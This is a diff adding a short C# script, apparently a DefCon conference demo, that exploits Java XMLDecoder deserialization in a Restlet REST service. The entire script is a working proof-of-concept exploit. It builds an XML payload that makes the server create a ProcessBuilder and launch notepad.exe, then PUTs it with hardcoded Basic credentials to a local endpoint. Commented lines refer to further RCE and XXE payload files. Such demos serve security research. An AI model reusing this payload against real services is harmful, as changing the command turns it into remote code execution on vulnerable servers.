@@ -1,0 +1,36 @@
+//var topPanel = "{name}".popupWindow(700,400);
+var topPanel = panel.clear().add_Panel();
+
+//var payload = @"C:\_Presentation\DefCon_RESTing\Demos\RestletXMLDecoder\customer.xml"
+//					.fileContents();
+//var payload = @"C:\_Presentation\DefCon_RESTing\Demos\RestletXMLDecoder\customer-rce.xml"
+//					.fileContents();			
+var className  = "java.lang.ProcessBuilder";
+var firstParam = "c:\\Windows\\System32\\notepad.exe";
+var methodName  = "start";		
+var payload     = "<?xml version=\"1.0\"?><java>  " +
+                    "<object class=\""+className+"\">" +
+                        "<array class=\"java.lang.String\" length=\"1\" >"+
+                            "<void index=\"0\">   " +
+                                "<string>" + firstParam + "</string>" +
+                            "</void>" +
+                        "</array>" +
+                        "<void method=\""+ methodName + "\" /> "+
+                    "</object></java>";
+var url = "http://localhost.:8182/customer";
+
+//var payload = @"C:\_Presentation\DefCon_RESTing\Demos\RestletXMLDecoder\customer-xxe.xml"
+//					.fileContents();			
+
+
+//return payload.fileContents();
+var httpClient = new HttpClient();
+httpClient.DefaultHeaders.ContentType = "application/x-java-serialized-object+xml";
+httpClient.DefaultHeaders.Add("Authorization", "Basic " + "scott:tiger".base64Encode()); 
+
+var response = httpClient.Put(url, HttpContent.Create(payload));
+
+return response.Content.ReadAsString();
+
+//using Microsoft.Http
+//O2Ref:O2_Misc_Microsoft_MPL_Libs.dll
